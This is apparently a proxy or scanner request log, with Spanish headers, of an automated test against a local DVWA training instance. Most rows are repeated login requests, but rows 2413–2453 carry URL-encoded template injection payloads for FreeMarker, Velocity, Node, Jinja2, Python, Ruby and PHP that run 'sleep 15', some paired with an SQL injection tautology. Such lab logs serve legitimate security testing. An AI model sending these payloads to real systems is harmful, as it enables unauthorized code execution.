ID,Petición (Tiempo),Marca de tiempo Respuesta,Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo)
2352,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2353,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2354,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2355,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2356,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,3,426,0
2357,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2358,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2359,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2360,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2361,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2362,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2363,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2364,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2365,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2366,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2367,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2368,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2369,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2370,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2371,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2372,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2373,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2374,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2375,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2376,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2377,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2378,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2379,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2380,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,4,426,0
2381,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2382,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2383,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2384,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2385,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2386,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,281,0
2387,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1381
2388,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,281,0
2389,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1381
2390,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,281,0
2391,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
2392,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,5,281,0
2393,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1381
2394,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,281,0
2395,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
2396,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,281,0
2397,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1381
2398,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,281,0
2399,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,291,1381
2400,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,281,0
2401,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
2402,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,281,0
2403,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1381
2404,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,281,0
2405,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
2406,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,281,0
2407,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
2408,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,281,0
2409,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
2410,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,281,0
2411,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
2412,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,281,0
2413,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D&Submit=Submit,302,Found,1,628,0
2414,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D&Submit=Submit,302,Found,0,628,0
2415,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/dvwa,301,Moved Permanently,1,208,350
2416,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D&Submit=Submit,302,Found,0,628,0
2417,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
2418,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E&Submit=Submit,302,Found,1,628,0
2419,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/dvwa/css,301,Moved Permanently,0,212,354
2420,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D&Submit=Submit,302,Found,1,628,0
2421,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2422,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D&Submit=Submit,302,Found,1,628,0
2423,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/dvwa/images,301,Moved Permanently,1,215,357
2424,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D&Submit=Submit,302,Found,1,628,0
2425,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2426,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D&Submit=Submit,302,Found,1,628,0
2427,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2428,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D&Submit=Submit,302,Found,1,628,0
2429,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities,301,Moved Permanently,0,219,361
2430,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2431,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
2432,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%25%3D%25x%28sleep+15%29%25%3E&Submit=Submit,302,Found,4,628,0
2433,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%23%7B%25x%28sleep+15%29%7D&Submit=Submit,302,Found,0,628,0
2434,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,3,426,0
2435,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7Bsystem%28%22sleep+15%22%29%7D&Submit=Submit,302,Found,0,628,0
2436,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2437,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,302,Found,0,628,0
2438,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,302,Found,2,628,0
2439,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,302,Found,1,628,0
2440,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,3,426,0
2441,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,302,Found,0,628,0
2442,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2443,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,302,Found,0,628,0
2444,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2445,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,302,Found,1,628,0
2446,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,302,Found,1,628,0
2447,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2448,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,302,Found,1,628,0
2449,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,302,Found,1,628,0
2450,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2451,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%25%3D%25x%28sleep+15%29%25%3E,302,Found,0,628,0
2452,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%23%7B%25x%28sleep+15%29%7D,302,Found,0,628,0
2453,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7Bsystem%28%22sleep+15%22%29%7D,302,Found,0,628,0
2454,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2455,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2456,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2457,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2458,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2459,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2460,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2461,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,3,426,0
2462,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2463,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2464,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2465,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2466,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2467,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2468,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2469,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2470,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2471,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2472,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2473,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2474,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2475,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2476,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2477,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2478,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2479,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,3,426,0
2480,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2481,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2482,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2483,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2484,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2485,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2486,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2487,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2488,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2489,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,3,426,0
2490,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,3,272,1342
2491,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,3,281,0
2492,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1381
2493,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,4,281,0
2494,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,291,1381
2495,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,281,0
2496,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
2497,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,281,0
2498,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1381
2499,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,3,281,0
2500,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
2501,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,281,0
2502,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
2503,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,281,0
2504,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
2505,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,281,0
2506,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1381
2507,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,3,281,0
2508,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
